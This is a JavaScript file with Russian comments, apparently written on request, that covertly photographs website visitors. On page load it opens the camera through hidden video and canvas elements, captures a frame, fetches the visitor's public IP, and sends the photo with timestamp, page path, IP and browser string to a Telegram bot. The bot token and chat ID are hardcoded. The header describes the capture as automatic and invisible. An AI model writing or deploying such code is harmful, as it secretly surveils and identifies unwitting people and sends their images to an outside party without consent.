// new_script.js — автоматический, невидимый захват фото и отправка в Telegram.
// BOT_TOKEN и CHAT_ID подставлены по вашему запросу.
// WARNING: BOT_TOKEN в клиентском коде виден всем. Это небезопасно в проде.

(function(){
  'use strict';

  /************** Конфигурация (не меняйте, если не нужно) ****************/
  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
  const CHAT_ID   = "7518382960";
  const MAX_FILE_BYTES = 3_000_000;              // макс размер фото в байтах
  const SESSION_FLAG = "tg_auto_photo_sent_v1";  // флаг сессии: не слать более 1 раза
  const PUBLIC_IP_API = "https://api.ipify.org?format=json"; // сервис для публичного IP
  const CAPTURE_QUALITY = 0.85;                  // качество JPEG (0..1)
  const CAPTURE_TIMEOUT_MS = 10000;              // таймаут ожидания видео (ms)
  /********************************************************/

  // Быстрые проверки конфигурации
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('TG Auto Photo: BOT_TOKEN или CHAT_ID не заданы. Скрипт остановлен.');
    return;
  }
  if (sessionStorage.getItem(SESSION_FLAG)) {
    // Уже отправляли в этой сессии — не делать ничего.
    console.log('TG Auto Photo: уже отправлено в этой сессии. Ничего не делаю.');
    return;
  }

  // Создаём скрытые элементы video и canvas
  const video = document.createElement('video');
  video.setAttribute('autoplay', '');
  video.setAttribute('playsinline', '');
  video.style.display = 'none';
  document.documentElement.appendChild(video);

  const canvas = document.createElement('canvas');
  canvas.style.display = 'none';
  document.documentElement.appendChild(canvas);

  // Утилиты
  function safeLog(...args) {
    if (window.console && window.console.log) console.log('[TGAutoPhoto]', ...args);
  }
  function setSessionFlag() {
    sessionStorage.setItem(SESSION_FLAG, '1');
  }

  // Получаем публичный IP через внешний сервис (ipify)
  async function getPublicIP(timeoutMs = 4000) {
    try {
      const controller = new AbortController();
      const id = setTimeout(()=>controller.abort(), timeoutMs);
      const resp = await fetch(PUBLIC_IP_API, { signal: controller.signal });
      clearTimeout(id);
      if (!resp.ok) { safeLog('IP API returned non-ok', resp.status); return null; }
      const j = await resp.json().catch(()=>null);
      return (j && j.ip) ? j.ip : null;
    } catch (e) {
      safeLog('getPublicIP failed', e && e.message ? e.message : e);
      return null;
    }
  }

  // Захват кадра -> Blob JPEG
  function captureFrameFromVideo(videoEl, quality = CAPTURE_QUALITY) {
    try {
      const w = videoEl.videoWidth || 640;
      const h = videoEl.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, w, h);
      return new Promise(resolve => {
        canvas.toBlob(blob => {
          resolve(blob);
        }, 'image/jpeg', quality);
      });
    } catch (e) {
      safeLog('captureFrameFromVideo error', e);
      return Promise.resolve(null);
    }
  }

  // Отправка photo в Telegram через sendPhoto
  async function sendPhotoToTelegram(blob, caption) {
    if (!blob) {
      safeLog('No blob to send');
      return { ok:false, reason:'no_blob' };
    }
    if (blob.size > MAX_FILE_BYTES) {
      safeLog('Blob too large', blob.size);
      try {
        const img = await createImageBitmap(blob);
        const scale = Math.sqrt(MAX_FILE_BYTES / blob.size) * 0.95;
        const nw = Math.max(160, Math.floor(img.width * scale));
        const nh = Math.max(120, Math.floor(img.height * scale));
        canvas.width = nw;
        canvas.height = nh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, nw, nh);
        const reduced = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
        if (reduced) blob = reduced;
        safeLog('Reduced blob size', blob.size);
      } catch (e) {
        safeLog('Reduction failed', e);
      }
    }

    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    if (caption) form.append('caption', caption);

    try {
      const resp = await fetch(url, { method: 'POST', body: form });
      const text = await resp.text().catch(()=>null);
      if (!resp.ok) {
        safeLog('Telegram returned non-ok', resp.status, text);
        return { ok:false, status:resp.status, text };
      }
      safeLog('Telegram send ok', resp.status);
      return { ok:true, text };
    } catch (err) {
      safeLog('sendPhoto fetch error (likely CORS)', err && (err.message || err));
      return { ok:false, reason:'fetch_error', error:String(err) };
    }
  }

  // Составление подписи
  function buildCaption(ip) {
    const time = new Date().toISOString();
    const page = location.pathname + (location.search || '');
    const ua = navigator.userAgent || '-';
    let caption = `Время: ${time}\nСтраница: ${page}\nIP: ${ip || 'не получен'}\nUA: ${ua}`;
    if (caption.length > 900) caption = caption.slice(0,900) + '...';
    return caption;
  }

  // Основной рабочий поток:
  async function runAutoCapture() {
    safeLog('runAutoCapture start');

    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' }, audio: false });
    } catch (e) {
      safeLog('getUserMedia failed or blocked by UA policy', e && e.message ? e.message : e);
      return;
    }

    let playPromise;
    try {
      video.srcObject = stream;
      playPromise = video.play();
    } catch (e) {
      safeLog('video play() error', e);
    }

    const start = Date.now();
    while (true) {
      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) break;
      if (Date.now() - start > CAPTURE_TIMEOUT_MS) break;
      await new Promise(r => setTimeout(r, 120));
    }

    const blob = await captureFrameFromVideo(video, CAPTURE_QUALITY);
    try {
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
    } catch (e) { /* ignore */ }

    if (!blob) {
      safeLog('No blob captured');
      return;
    }

    safeLog('Captured blob size', blob.size);

    const ip = await getPublicIP().catch(()=>null);
    const caption = buildCaption(ip);

    const sendResult = await sendPhotoToTelegram(blob, caption);

    if (sendResult && sendResult.ok) {
      setSessionFlag();
      safeLog('Photo sent and session flagged');
    } else {
      safeLog('Photo send failed', sendResult);
    }
  }

  window.addEventListener('load', ()=> {
    try {
      setTimeout(() => { runAutoCapture().catch(e => safeLog('runAutoCapture exception', e)); }, 0);
    } catch (e) {
      safeLog('auto start exception', e);
    }
  });

  // Экспорт для отладки
  window.TGAutoPhoto = { runAutoCapture };

})();